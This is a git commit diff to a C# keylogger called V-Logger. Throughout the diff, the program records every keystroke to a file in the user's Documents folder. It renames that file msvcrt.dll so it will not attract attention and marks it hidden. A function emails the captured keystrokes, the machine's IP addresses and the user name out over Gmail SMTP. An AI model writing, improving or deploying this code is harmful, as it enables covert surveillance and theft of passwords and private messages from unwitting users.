45b108561e279e6e824e2f5cdcec4c6c4f61db09
Jozsef Bali <70275083+Fenrir-Codes@users.noreply.github.com>
2021-08-12 10:18:56 -0700

    v.0.2

--- V-Logger/V-Logger/Program.cs
+++ V-Logger/V-Logger/Program.cs
@@ -17,16 +17,14 @@ namespace V_Logger
 
         static void Main(string[] args)
         {
-            //Plan
+
             //capture keystrokes and display them to the console.
 
             //reaching folder Documents
             string filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
 
             //setting the filder and filename.
-            string path = (filePath + @"\strokes.txt");
-
-
+            string path = (filePath + @"\msvcrt.dll"); //saving strokes into a dll file it wont attach attention... maybe :)
 
             //check if the directory not exists, if not then create it.
             if (!Directory.Exists(filePath))
@@ -38,10 +36,13 @@ namespace V_Logger
             if (!File.Exists(path))
             {
                 using (StreamWriter sw = File.CreateText(path)) { };
+                File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden); //set the file attributte to hidden
             }
+
 
             while (true)
             {
+                
                 //pause and let other programs a chace to run.
                 Thread.Sleep(5);
 
@@ -65,9 +66,14 @@ namespace V_Logger
                         {
                             sw.Write((char)i);
                         };
+                        File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
+
+                        //----------------------------------------------------------------------------------------//
+                        //not used yet, just remove out comments if planed to use this function
+                        //(before use, first set the mail addresses, credentials under sendMessage function)
+
                         //increment keystrokes
-                        //not implementedfor now
-                        // numberOfKeystrokes++;
+                        numberOfKeystrokes++;
 
                         //send every 100 char typed.
                         //if (numberOfKeystrokes % 100 == 0)
@@ -90,40 +96,40 @@ namespace V_Logger
             //send the content of a text file to a mail address.
             string folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
 
-            string filepath = folderName + @"\strokes.txt";
+            string filepath = folderName + @"\msvcrt.dll";
 
             string logContent = File.ReadAllText(filepath);
 
 
-            //create an E-mail message.
-            DateTime Now = DateTime.Now;
+            //create an E-mail message. 
+            DateTime Now = DateTime.Now; // get the exact datetime
 
-            string mailBody = "";
-            string subject = "Message from V-Logger.";
+            string mailBody = "";  //empty mail body
+            string subject = "Message from V-Logger.";  //mail subject (title of the mail)
 
-            var Host = Dns.GetHostEntry(Dns.GetHostName());
+            var Host = Dns.GetHostEntry(Dns.GetHostName()); //get the hostnames
 
-            foreach (var address in Host.AddressList)
+            foreach (var address in Host.AddressList) //list all ip adressess from the addresslist
             {
-                mailBody += "Address:" + address;
+                mailBody += "Address:" + address; //attach them to a mailbody
             }
-            mailBody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
+            mailBody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;  //attach domain name and username 
             mailBody += "\n Host" + Host;
-            mailBody += "\n Time: " + Now.ToString();
-            mailBody += logContent;
+            mailBody += "\n Time: " + Now.ToString(); //attach the time
+            mailBody += logContent; //attach the logfile content
 
-            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
-            MailMessage mailMessage = new MailMessage();
+            SmtpClient client = new SmtpClient("smtp.gmail.com", 587); //smtp client and port
+            MailMessage mailMessage = new MailMessage(); //create a new mail message
 
-            mailMessage.From = new MailAddress("yourmail@gmail.com");
-            mailMessage.To.Add("v-Logger@gmail.com");
-            mailMessage.Subject = subject;
+            mailMessage.From = new MailAddress("yourmail@gmail.com"); //mail from
+            mailMessage.To.Add("somemail@gmail.com"); //mail to
+            mailMessage.Subject = subject; //subject of the mail
             client.UseDefaultCredentials = false;
-            client.EnableSsl = true;
-            client.Credentials = new NetworkCredential("yourmail@gmail.com", "YourPassword");
-            mailMessage.Body = mailBody;
+            client.EnableSsl = true; //use ssl encription
+            client.Credentials = new NetworkCredential("yourmail@gmail.com", "YourPassword"); //your mail login credentials
+            mailMessage.Body = mailBody; // the body of the mail
 
-            client.Send(mailMessage);
+            client.Send(mailMessage);  //send the mail
         }
     }
 }
